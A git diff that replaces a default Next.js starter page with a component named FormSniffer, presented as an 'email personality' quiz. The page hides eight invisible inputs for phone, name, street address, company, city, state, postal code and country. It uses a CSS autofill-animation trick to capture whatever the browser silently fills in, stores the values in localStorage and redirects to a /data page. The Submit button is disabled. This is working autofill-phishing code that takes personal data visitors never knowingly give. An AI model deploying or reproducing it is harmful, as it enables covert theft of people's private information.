@@ -1,101 +1,153 @@
-import Image from "next/image";
+"use client";
 
-export default function Home() {
+import React, { useEffect, useRef } from "react";
+import GalaxyScene from "../components/GalaxyScene";
+import { useRouter } from 'next/navigation';
+
+function FormSniffer() {
+  const router = useRouter();
+  const formRef = useRef<HTMLFormElement | null>(null);
+  const allFieldsRef = useRef<Record<string, string>>({});
+  const printedRef = useRef(false);
+
+
+  const autofillFieldsRef = useRef<Record<string, boolean>>({});
+
+  useEffect(() => {
+    const form = formRef.current;
+    if (!form) return;
+
+    const inputs = form.querySelectorAll("input");
+
+
+    const style = document.createElement("style");
+    style.innerHTML = `
+      @keyframes autofill {
+        to { color: #000; }
+      }
+      input:-webkit-autofill {
+        animation-name: autofill;
+        animation-duration: 0.5s;
+      }
+    `;
+    document.head.appendChild(style);
+
+    const handleAnimationStart = (e: AnimationEvent) => {
+      if (e.animationName === "autofill") {
+        const input = e.target as HTMLInputElement;
+        autofillFieldsRef.current[input.name] = true;
+      }
+    };
+
+    const handleChange = (e: Event) => {
+      const input = e.target as HTMLInputElement;
+      if (autofillFieldsRef.current[input.name] && input.value) {
+        allFieldsRef.current[input.name] = input.value;
+        if (!printedRef.current) {
+          console.log(allFieldsRef.current);
+          printedRef.current = true;
+
+
+          setTimeout(() => {
+            // Re-check all fields before navigating, to ensure we have all autofills
+            const form = formRef.current;
+            if (form) {
+              const allInputs = form.querySelectorAll('input');
+              allInputs.forEach((inp) => {
+                if (inp.value && autofillFieldsRef.current[inp.name]) {
+                  allFieldsRef.current[inp.name] = inp.value;
+                }
+              });
+            }
+
+
+            const jsonData = JSON.stringify(allFieldsRef.current);
+            window.localStorage.setItem("autofilledData", jsonData);
+
+
+            router.push(`/data`);
+          }, 200);
+        }
+      }
+    };
+
+    inputs.forEach((input) => {
+      input.addEventListener("animationstart", handleAnimationStart);
+      input.addEventListener("change", handleChange);
+    });
+
+    return () => {
+      inputs.forEach((input) => {
+        input.removeEventListener("animationstart", handleAnimationStart);
+        input.removeEventListener("change", handleChange);
+      });
+      if (style.parentNode) {
+        document.head.removeChild(style);
+      }
+    };
+  }, [router]);
+
   return (
-    <div className="grid grid-rows-[20px_1fr_20px] items-center justify-items-center min-h-screen p-8 pb-20 gap-16 sm:p-20 font-[family-name:var(--font-geist-sans)]">
-      <main className="flex flex-col gap-8 row-start-2 items-center sm:items-start">
-        <Image
-          className="dark:invert"
-          src="/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol className="list-inside list-decimal text-sm text-center sm:text-left font-[family-name:var(--font-geist-mono)]">
-          <li className="mb-2">
-            Get started by editing{" "}
-            <code className="bg-black/[.05] dark:bg-white/[.06] px-1 py-0.5 rounded font-semibold">
-              src/app/page.tsx
-            </code>
-            .
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
+    <div className="relative w-full h-screen">
 
-        <div className="flex gap-4 items-center flex-col sm:flex-row">
-          <a
-            className="rounded-full border border-solid border-transparent transition-colors flex items-center justify-center bg-foreground text-background gap-2 hover:bg-[#383838] dark:hover:bg-[#ccc] text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5"
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-          >
-            <Image
-              className="dark:invert"
-              src="/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
+      <GalaxyScene />
+
+
+      <div className="relative z-10 flex flex-col items-center justify-center h-full">
+
+        <h1 className="mb-4 text-4xl font-extrabold tracking-tight text-gray-900 dark:text-white">
+          What does your email say about your personality?
+        </h1>
+        <p className="mb-6 text-lg text-gray-500 dark:text-gray-400 lg:text-xl">
+          Enter your email to uncover the unique traits it reveals about you.
+        </p>
+
+
+        <div className="flex items-center space-x-4">
+          <form ref={formRef} autoComplete="on" className="flex items-center">
+            <label className="text-gray-400 mr-3" htmlFor="email">
+              Email
+            </label>
+            <input
+              id="email"
+              type="email"
+              name="email"
+              autoComplete="email"
+              className="text-transparent border-2 bg-transparent border-cyan-500 focus:border-blue-600 focus:ring-2 focus:ring-blue-600 p-2 rounded-lg"
             />
-            Deploy now
-          </a>
-          <a
-            className="rounded-full border border-solid border-black/[.08] dark:border-white/[.145] transition-colors flex items-center justify-center hover:bg-[#f2f2f2] dark:hover:bg-[#1a1a1a] hover:border-transparent text-sm sm:text-base h-10 sm:h-12 px-4 sm:px-5 sm:min-w-44"
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+
+
+            {[
+              { id: "phone", name: "phone", autoComplete: "tel" },
+              { id: "name", name: "name", autoComplete: "name" },
+              { id: "address", name: "address", autoComplete: "street-address" },
+              { id: "company", name: "company", autoComplete: "organization" },
+              { id: "city", name: "city", autoComplete: "address-level2" },
+              { id: "state", name: "state", autoComplete: "address-level1" },
+              { id: "postal_code", name: "postal_code", autoComplete: "postal-code" },
+              { id: "country", name: "country", autoComplete: "country" },
+            ].map((field) => (
+              <input
+                key={field.id}
+                id={field.id}
+                type="text"
+                name={field.name}
+                autoComplete={field.autoComplete}
+                className="absolute opacity-0 pointer-events-none h-0 w-0"
+              />
+            ))}
+          </form>
+
+          <button
+            disabled
+            className="bg-transparent text-gray-600 border-2 border-cyan-900 font-semibold py-2 px-4 rounded-lg cursor-not-allowed hover:text-gray-800 hover:border-gray-500"
           >
-            Read our docs
-          </a>
+            Submit
+          </button>
         </div>
-      </main>
-      <footer className="row-start-3 flex gap-6 flex-wrap items-center justify-center">
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          className="flex items-center gap-2 hover:underline hover:underline-offset-4"
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
+      </div>
     </div>
   );
 }
+
+export default FormSniffer;
